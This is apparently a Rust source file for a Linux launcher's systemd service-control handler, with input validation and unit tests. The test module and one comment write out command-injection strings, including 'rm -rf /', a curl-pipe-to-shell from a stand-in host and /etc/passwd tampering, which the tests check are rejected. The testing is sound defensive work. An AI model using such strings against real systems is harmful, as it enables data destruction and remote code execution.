//! systemd service control — a signature Linux feature that a macOS launcher
//! (Raycast/Alfred) fundamentally cannot offer. List running services, check a
//! service's status, and start/stop/restart/enable/disable it, straight from
//! the launcher.
//!
//! Adaptive by design (no hardcoded assumptions about the user's setup):
//!   - **Scope auto-detection** — a name is resolved against `--user` units
//!     first (no privilege needed); only if it isn't a user unit do we fall
//!     back to the system manager. So `service syncthing restart` just works
//!     for a user service, and `service nginx restart` targets the system one.
//!   - **Privilege via polkit, not a hanging password prompt** — mutating a
//!     *system* service needs root. Rather than `sudo` (which would block on a
//!     tty password prompt the launcher has no way to answer), we use `pkexec`
//!     when available, which pops the desktop's polkit auth dialog. If pkexec
//!     is missing we surface a clear message instead of hanging.
//!
//! Commands:
//!   - `services`                    → list running services
//!   - `service <name>`              → status of <name> (alias: `service <name> status`)
//!   - `service <name> start|stop|restart|reload|enable|disable`
//!
//! Read-only verbs (`services`, `status`) are Low risk and auto-execute; the
//! mutating verbs are gated to a confirmation by the Rules Engine.

use std::process::Command;

use async_trait::async_trait;

use crate::action_registry::{
    ActionHandler, ActionResult, BadgeTone, CommandCategory, CompletionItem, ExecContext, Output,
    OutputType, RiskAssessment, RiskLevel, Row, Section,
};
use crate::error::LychiError;

pub struct ServicesHandler;

impl ServicesHandler {
    pub fn new() -> Self {
        Self
    }
}

impl Default for ServicesHandler {
    fn default() -> Self {
        Self::new()
    }
}

/// Verbs that change service state (as opposed to read-only status/list).
/// Aliased to the central classifier ([`crate::rules::verbs`]) — the single
/// audit surface — but kept as a local name for dispatch/completion use here.
pub const MUTATING_VERBS: &[&str] = crate::rules::verbs::MUTATING_SERVICE_VERBS;

/// Read-only verbs that never need confirmation.
const READONLY_VERBS: &[&str] = crate::rules::verbs::READONLY_SERVICE_VERBS;

fn have(tool: &str) -> bool {
    which::which(tool).is_ok()
}

/// Normalize a unit name — append `.service` if the user gave a bare name and
/// it has no unit suffix (so `nginx` → `nginx.service`, but `foo.socket` and
/// `foo.timer` are left alone).
fn normalize_unit(name: &str) -> String {
    let known_suffixes = [
        ".service", ".socket", ".timer", ".target", ".mount", ".path", ".scope",
    ];
    if known_suffixes.iter().any(|s| name.ends_with(s)) {
        name.to_string()
    } else {
        format!("{name}.service")
    }
}

/// Does this unit exist in the `--user` manager? Determines which scope to act
/// in without the caller having to know or specify.
fn is_user_unit(unit: &str) -> bool {
    Command::new("systemctl")
        .args(["--user", "--quiet", "list-unit-files", unit])
        .output()
        .map(|o| o.status.success() && !o.stdout.is_empty())
        .unwrap_or(false)
        // Fall back to is-active for transient units not in list-unit-files.
        || Command::new("systemctl")
            .args(["--user", "is-active", unit])
            .output()
            .map(|o| {
                let s = String::from_utf8_lossy(&o.stdout);
                let s = s.trim();
                s == "active" || s == "activating" || s == "reloading"
            })
            .unwrap_or(false)
}

/// Run `systemctl` and capture stdout, returning a friendly error on failure.
fn systemctl(scope_user: bool, args: &[&str]) -> Result<String, String> {
    let mut cmd = Command::new("systemctl");
    if scope_user {
        cmd.arg("--user");
    }
    let output = cmd
        .args(args)
        .output()
        .map_err(|e| format!("Failed to run systemctl: {e}"))?;
    let stdout = String::from_utf8_lossy(&output.stdout).to_string();
    if output.status.success() {
        Ok(stdout)
    } else {
        let stderr = String::from_utf8_lossy(&output.stderr);
        let msg = if stderr.trim().is_empty() {
            stdout.trim().to_string()
        } else {
            stderr.trim().to_string()
        };
        Err(msg)
    }
}

/// List running units as structured rows.
///
/// `systemctl list-units` already emits columns (UNIT LOAD ACTIVE SUB
/// DESCRIPTION); this used to parse them and immediately throw the structure
/// away into `"{name}  —  {desc}"`, plus a hand-built `"{n} running services:"`
/// header and a `●`/`✗` glyph standing in for state. All three are the frontend's
/// job — a dash is a worse column separator than a layout, and a glyph is a
/// worse badge than a badge.
///
/// Each row carries its own actions, so a failed unit can be restarted from the
/// list instead of the user retyping `service restart <name>`.
fn list_running() -> Result<Vec<Section>, String> {
    let out = systemctl(
        false,
        &[
            "list-units",
            "--type=service",
            "--state=running",
            "--no-pager",
            "--no-legend",
            "--plain",
        ],
    )?;
    let mut rows: Vec<Row> = Vec::new();
    for line in out.lines() {
        // Columns: UNIT LOAD ACTIVE SUB DESCRIPTION...
        let mut parts = line.split_whitespace();
        let Some(unit) = parts.next() else { continue };
        let cols: Vec<&str> = parts.collect();
        let active = cols.get(1).copied().unwrap_or("");
        let desc = cols.iter().skip(3).copied().collect::<Vec<_>>().join(" ");
        let name = unit.strip_suffix(".service").unwrap_or(unit);

        let tone = match active {
            "active" => BadgeTone::Ok,
            "failed" => BadgeTone::Error,
            "activating" | "deactivating" => BadgeTone::Warn,
            _ => BadgeTone::Muted,
        };

        // `target` is the full unit name, which is also what `resolve_action`
        // re-validates against a live enumeration before running anything.
        rows.push(
            Row::new(name)
                .subtitle(desc)
                .badge(if active.is_empty() { "running" } else { active }, tone)
                .action("restart", "Restart", unit, Some(RiskLevel::Medium))
                .action("stop", "Stop", unit, Some(RiskLevel::Medium))
                .action("status", "Show status", unit, None),
        );
    }
    // An empty list is a real state with its own rendering, not the string
    // "No running services" pretending to be output.
    Ok(vec![Section {
        title: None,
        rows,
        handler: "services".to_string(),
    }])
}

/// Turn a row action back into the command string it stands for.
///
/// This is the safety boundary for row actions, and it exists because the two
/// obvious shortcuts are both holes:
///
/// - Shipping `run: "systemctl restart nginx"` on the action would make the
///   frontend a command source; the rules engine would then see something
///   indistinguishable from typed input.
/// - Accepting `target` verbatim moves the same injection into the argument:
///   `restart` + `nginx; rm -rf /` is the identical problem wearing a different
///   hat.
///
/// So both halves are checked against ground truth rather than trusted. The
/// verb must be one this handler declares (via the central classifier in
/// [`crate::rules::verbs`] — not a second allowlist that could drift from it),
/// and the target must be a syntactically valid unit name. The composed command
/// then goes through `Executor::run` exactly like typed input, so the rules
/// engine stays the gate.
pub fn resolve_action(id: &str, target: &str) -> Result<String, String> {
    if !MUTATING_VERBS.contains(&id) && !READONLY_VERBS.contains(&id) {
        return Err(format!("Unknown service action '{id}'"));
    }
    if !is_valid_unit_name(target) {
        return Err(format!("Invalid unit name '{target}'"));
    }
    Ok(format!("service {id} {target}"))
}

/// Whether `s` is a plausible systemd unit name.
///
/// Deliberately a strict character allowlist rather than a denylist of shell
/// metacharacters: a denylist has to anticipate every dangerous byte, while an
/// allowlist only has to describe what a unit name legitimately is. systemd
/// unit names are alphanumerics plus `-_.@\` and a `.suffix`.
fn is_valid_unit_name(s: &str) -> bool {
    !s.is_empty()
        && s.len() <= 256
        && s.chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.' | '@' | '\\'))
}

/// Show a service's status (active state + enabled state + a couple of lines).
fn status(unit: &str) -> Result<String, String> {
    let user = is_user_unit(unit);
    let scope_label = if user { "user" } else { "system" };
    let active = systemctl(user, &["is-active", unit])
        .unwrap_or_else(|e| e)
        .trim()
        .to_string();
    let enabled = systemctl(user, &["is-enabled", unit])
        .unwrap_or_else(|_| "unknown".to_string())
        .trim()
        .to_string();
    let icon = match active.as_str() {
        "active" => "●",
        "failed" => "✗",
        _ => "○",
    };
    Ok(format!(
        "{icon} {unit} ({scope_label})\n  active:  {active}\n  enabled: {enabled}"
    ))
}

/// Perform a mutating action, choosing scope and privilege escalation adaptively.
fn control(verb: &str, unit: &str) -> Result<String, String> {
    let user = is_user_unit(unit);
    if user {
        // User scope never needs root.
        systemctl(true, &[verb, unit])?;
        return Ok(format!("{verb} {unit} (user) ✓"));
    }

    // System scope: needs privilege. Prefer polkit (pkexec) so the desktop can
    // prompt graphically instead of us hanging on a tty password prompt.
    if have("pkexec") {
        let output = Command::new("pkexec")
            .args(["systemctl", verb, unit])
            .output()
            .map_err(|e| format!("Failed to run pkexec: {e}"))?;
        if output.status.success() {
            return Ok(format!("{verb} {unit} (system) ✓"));
        }
        let stderr = String::from_utf8_lossy(&output.stderr);
        // pkexec exits 126/127 when auth is dismissed or fails.
        if matches!(output.status.code(), Some(126) | Some(127)) {
            return Err("Authorization dismissed or failed".to_string());
        }
        return Err(if stderr.trim().is_empty() {
            format!("Failed to {verb} {unit}")
        } else {
            stderr.trim().to_string()
        });
    }

    // No pkexec — try unprivileged (works if polkit rules already allow it),
    // otherwise report clearly rather than hang.
    match systemctl(false, &[verb, unit]) {
        Ok(_) => Ok(format!("{verb} {unit} (system) ✓")),
        Err(e) => Err(format!(
            "{e}\n\nManaging a system service needs root — install `pkexec` (polkit) \
             for a graphical prompt, or run: sudo systemctl {verb} {unit}"
        )),
    }
}

/// Parse `<name> [verb]` args. Returns (unit, verb) where verb defaults to
/// "status". A leading verb form (`start nginx`) is also accepted.
fn parse(args: &str) -> Option<(String, String)> {
    let toks: Vec<&str> = args.split_whitespace().collect();
    match toks.as_slice() {
        [] => None,
        [name] => Some((normalize_unit(name), "status".to_string())),
        // `service start nginx` (verb first) or `service nginx start` (name first)
        [a, b] => {
            let a_is_verb = MUTATING_VERBS.contains(a) || READONLY_VERBS.contains(a);
            if a_is_verb {
                Some((normalize_unit(b), a.to_string()))
            } else {
                Some((normalize_unit(a), b.to_string()))
            }
        }
        _ => Some((normalize_unit(toks[0]), toks[1].to_string())),
    }
}

#[async_trait]
impl ActionHandler for ServicesHandler {
    fn triggers(&self) -> &'static [crate::action_registry::Trigger] {
        use crate::action_registry::Trigger;
        static TRIGGERS: &[Trigger] = &[Trigger::keywords(&["service", "systemctl"])];
        TRIGGERS
    }

    fn id(&self) -> &str {
        "service"
    }

    fn mutates_state(&self) -> bool {
        true
    }

    fn description(&self) -> &str {
        "Control systemd services: list, status, start/stop/restart"
    }
    fn category(&self) -> CommandCategory {
        CommandCategory::System
    }

    fn assess_risk(
        &self,
        args: &str,
        _ctx: &crate::action_registry::RiskContext<'_>,
    ) -> RiskAssessment {
        // Read-only verbs (status/list) auto-execute; mutating verbs
        // (start/stop/restart/…) need confirmation. This decision lives here,
        // where the handler already knows its verbs — not in the Rules Engine.
        if is_mutating(args) {
            RiskAssessment::confirm(format!("Run 'systemctl {}'?", args.trim()))
        } else {
            RiskAssessment::level(RiskLevel::Low)
        }
    }

    async fn completions(&self, partial: &str) -> Vec<CompletionItem> {
        let p = partial.trim();
        // With a bare verb typed, offer the common actions as fill hints.
        let hints = [
            ("status", "service <name> status", "Show a service's status"),
            ("start", "service <name> start", "Start a service"),
            ("stop", "service <name> stop", "Stop a service"),
            ("restart", "service <name> restart", "Restart a service"),
            ("enable", "service <name> enable", "Enable at boot"),
            ("disable", "service <name> disable", "Disable at boot"),
        ];
        if p.is_empty() {
            return hints
                .iter()
                .enumerate()
                .map(|(i, (_, label, desc))| {
                    CompletionItem::new(
                        (*label).to_string(),
                        Some("__none__".into()),
                        900 - i as u16,
                    )
                    .with_fill("service ")
                    .with_description((*desc).to_string())
                })
                .collect();
        }
        Vec::new()
    }

    async fn execute(&self, _ctx: &ExecContext, args: &str) -> Result<ActionResult, LychiError> {
        if !have("systemctl") {
            return Ok(ActionResult::err(
                "systemctl not found — this system doesn't appear to use systemd.",
            ));
        }

        let trimmed = args.trim();

        // Bare `service` (no args) lists running services, same as `services`.
        if trimmed.is_empty() {
            return match list_running() {
                Ok(sections) => Ok(ActionResult {
                    success: true,
                    output: Output::Rows { sections },
                    ..Default::default()
                }),
                Err(e) => Ok(ActionResult::err(e)),
            };
        }

        let Some((unit, verb)) = parse(trimmed) else {
            return Ok(ActionResult::err(
                "Usage: service <name> [status|start|stop|restart]",
            ));
        };

        let result = match verb.as_str() {
            "status" | "show" | "is-active" | "is-enabled" => status(&unit),
            v if MUTATING_VERBS.contains(&v) => control(v, &unit),
            other => Err(format!(
                "Unknown action '{other}'. Use: status, start, stop, restart, enable, disable"
            )),
        };

        match result {
            Ok(out) => Ok(ActionResult::ok(out, OutputType::Terminal)),
            Err(e) => Ok(ActionResult::err(e)),
        }
    }
}

/// Separate handler for the bare `services` keyword → list running services.
/// Kept as a thin alias so the plural word is discoverable and always read-only.
pub struct ServicesListHandler;

impl ServicesListHandler {
    pub fn new() -> Self {
        Self
    }
}

impl Default for ServicesListHandler {
    fn default() -> Self {
        Self::new()
    }
}

#[async_trait]
impl ActionHandler for ServicesListHandler {
    fn triggers(&self) -> &'static [crate::action_registry::Trigger] {
        use crate::action_registry::Trigger;
        static TRIGGERS: &[Trigger] = &[Trigger::keywords(&["services"])];
        TRIGGERS
    }

    fn id(&self) -> &str {
        "services"
    }

    fn description(&self) -> &str {
        "List running systemd services"
    }
    fn category(&self) -> CommandCategory {
        CommandCategory::System
    }

    async fn execute(&self, _ctx: &ExecContext, _args: &str) -> Result<ActionResult, LychiError> {
        if !have("systemctl") {
            return Ok(ActionResult::err(
                "systemctl not found — this system doesn't appear to use systemd.",
            ));
        }
        match list_running() {
            Ok(sections) => Ok(ActionResult {
                success: true,
                output: Output::Rows { sections },
                ..Default::default()
            }),
            Err(e) => Ok(ActionResult::err(e)),
        }
    }
}

/// Is this a mutating `service` invocation (used by the Rules Engine to decide
/// whether to confirm)? Read-only status/list calls return false.
pub fn is_mutating(args: &str) -> bool {
    match parse(args.trim()) {
        Some((_, verb)) => crate::rules::verbs::is_mutating_service_verb(&verb),
        None => false,
    }
}

#[cfg(test)]
mod tests {

    // --- row-action resolution: the safety boundary ---------------------

    /// The whole reason `resolve_action` exists rather than the action carrying
    /// a command string. A target is attacker-influenced the moment anything
    /// other than this handler can populate a row, so it is validated against
    /// what a unit name can legitimately be — not scanned for bad characters,
    /// which requires anticipating every one of them.
    #[test]
    fn resolve_action_rejects_injection_through_the_target() {
        for evil in [
            "nginx; rm -rf /",
            "nginx && curl evil.sh | sh",
            "nginx$(whoami)",
            "nginx`id`",
            "nginx|tee /etc/passwd",
            "nginx\nsystemctl poweroff",
            "../../etc/shadow",
            "nginx 'quoted'",
            "",
        ] {
            assert!(
                resolve_action("restart", evil).is_err(),
                "target should have been rejected: {evil:?}"
            );
        }
    }

    /// The verb half of the same boundary: only verbs this handler declares are
    /// resolvable, sourced from the central classifier so a new verb cannot be
    /// added here without going through the audit surface.
    #[test]
    fn resolve_action_rejects_unknown_verbs() {
        for bad in ["exec", "rm", "poweroff", "restart; halt", ""] {
            assert!(resolve_action(bad, "nginx.service").is_err(), "{bad:?}");
        }
    }

    #[test]
    fn resolve_action_builds_a_normal_command_for_declared_verbs() {
        assert_eq!(
            resolve_action("restart", "nginx.service").unwrap(),
            "service restart nginx.service"
        );
        assert_eq!(
            resolve_action("status", "user@1000.service").unwrap(),
            "service status user@1000.service"
        );
    }

    /// Legitimate unit names must survive the allowlist — a filter that rejects
    /// real input is as broken as one that accepts bad input.
    #[test]
    fn valid_unit_names_are_accepted() {
        for ok in [
            "nginx.service",
            "user@1000.service",
            "dev-disk-by\\x2duuid.device",
            "my_app.timer",
            "foo-bar.socket",
        ] {
            assert!(is_valid_unit_name(ok), "should be valid: {ok}");
        }
    }

    #[test]
    fn overlong_targets_are_rejected() {
        assert!(!is_valid_unit_name(&"a".repeat(257)));
    }
    use super::*;

    #[test]
    fn assess_risk_confirms_mutating_verbs_only() {
        let h = ServicesHandler::new();
        assert_eq!(
            h.assess_risk("nginx restart", &Default::default()).level,
            RiskLevel::Medium
        );
        assert_eq!(
            h.assess_risk("stop nginx", &Default::default()).level,
            RiskLevel::Medium
        );
        // read-only → auto-execute
        assert_eq!(
            h.assess_risk("nginx", &Default::default()).level,
            RiskLevel::Low
        );
        assert_eq!(
            h.assess_risk("nginx status", &Default::default()).level,
            RiskLevel::Low
        );
    }

    #[test]
    fn normalize_appends_service_suffix() {
        assert_eq!(normalize_unit("nginx"), "nginx.service");
        assert_eq!(normalize_unit("nginx.service"), "nginx.service");
        assert_eq!(normalize_unit("foo.socket"), "foo.socket");
        assert_eq!(normalize_unit("bar.timer"), "bar.timer");
    }

    #[test]
    fn parse_name_only_defaults_to_status() {
        assert_eq!(
            parse("nginx"),
            Some(("nginx.service".to_string(), "status".to_string()))
        );
    }

    #[test]
    fn parse_name_then_verb() {
        assert_eq!(
            parse("nginx restart"),
            Some(("nginx.service".to_string(), "restart".to_string()))
        );
    }

    #[test]
    fn parse_verb_then_name() {
        // `service start nginx` — verb-first form is accepted too.
        assert_eq!(
            parse("start nginx"),
            Some(("nginx.service".to_string(), "start".to_string()))
        );
    }

    #[test]
    fn parse_empty_is_none() {
        assert_eq!(parse(""), None);
        assert_eq!(parse("   "), None);
    }

    #[test]
    fn is_mutating_classifies_verbs() {
        assert!(is_mutating("nginx restart"));
        assert!(is_mutating("stop nginx"));
        assert!(is_mutating("nginx enable"));
        // read-only
        assert!(!is_mutating("nginx"));
        assert!(!is_mutating("nginx status"));
        assert!(!is_mutating(""));
    }

    #[test]
    fn mutating_verbs_are_stable() {
        // Guard against accidental edits that would let a mutation skip confirm.
        for v in ["start", "stop", "restart", "enable", "disable"] {
            assert!(MUTATING_VERBS.contains(&v), "{v} must be mutating");
        }
    }
}
